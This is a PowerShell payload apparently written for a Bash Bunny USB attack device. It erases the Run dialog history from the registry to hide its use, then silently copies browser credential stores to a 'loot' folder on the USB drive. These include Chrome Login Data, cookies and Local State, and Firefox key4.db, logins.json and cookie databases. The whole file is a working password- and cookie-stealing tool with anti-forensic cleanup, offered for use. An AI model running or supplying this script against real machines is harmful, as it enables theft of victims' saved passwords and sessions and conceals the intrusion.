# Remove run history from registry
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

# Get the path and filename for output
# find the connected BashBunny
$VolumeName = "BashBunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
 if ($_.VolumeName -eq $VolumeName) {
  $backupDrive = $_.DeviceID
 }
}

# See if a loot folder exists on USB, and if not create one
$TARGETDIR = $backupDrive + "\loot"
if(!(Test-Path -Path $TARGETDIR )){
 New-Item -ItemType directory -Path $TARGETDIR
}

# See if a loot folder exists on USB, and if not create one
$TARGETDIR = $backupDrive + "\loot\PassGrab-" + $computerSystem.Name
if(!(Test-Path -Path $TARGETDIR )){
 New-Item -ItemType directory -Path $TARGETDIR
}

New-Item -ItemType directory -Path $TARGETDIR\IE
New-Item -ItemType directory -Path $TARGETDIR\IE\Favorites
New-Item -ItemType directory -Path $TARGETDIR\chrome
New-Item -ItemType directory -Path $TARGETDIR\firefox

# xcopy arguments
# /C Continues copying even if errors occur.
# /Q Does not display file names when copying.
# /G Allows the copying of encrypted files to destination that does not suport encryption.
# /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
# /E Copies directories and subdirectories, including empty ones.

# Internet Explorer Browser Data
xcopy /C /Q /G /Y /E $env:userprofile\Favorites\* $TARGETDIR\IE\Favorites\
if (Test-Path $env:userprofile\AppData\Local\Microsoft\Windows\History) {
 xcopy /C /Q /G /Y /E $env:userprofile\AppData\Local\Microsoft\Windows\History\* $TARGETDIR\IE\
}

# Chrome Profile Data
if (Test-Path "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default") {
 xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\Login Data" $TARGETDIR\chrome\Default\
 xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" $TARGETDIR\chrome\Default\
 xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\Cookies" $TARGETDIR\chrome\Default\
 xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\History" $TARGETDIR\chrome\Default\
 xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Local State" $TARGETDIR\chrome\
}


# Firefox Profile Data
if (Test-Path $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles) {
 $ProfileDirs =@()
 $ProfileDir = Get-ChildItem $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\ | ForEach-Object{$_.Name}
 For($i = 0; $i -lt $ProfileDir.count; $i++) {
  $ProfileDirs += $ProfileDir
  Foreach ($ProfileDir in $ProfileDirs) {
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\places.sqlite $TARGETDIR\firefox\$ProfileDir\
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\key4.db $TARGETDIR\firefox\$ProfileDir\
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\logins.json $TARGETDIR\firefox\$ProfileDir\
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\cookies.sqlite $TARGETDIR\firefox\$ProfileDir\
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\formhistory.sqlite $TARGETDIR\firefox\$ProfileDir\
   xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\cert9.db $TARGETDIR\firefox\$ProfileDir\
   }
 } 
}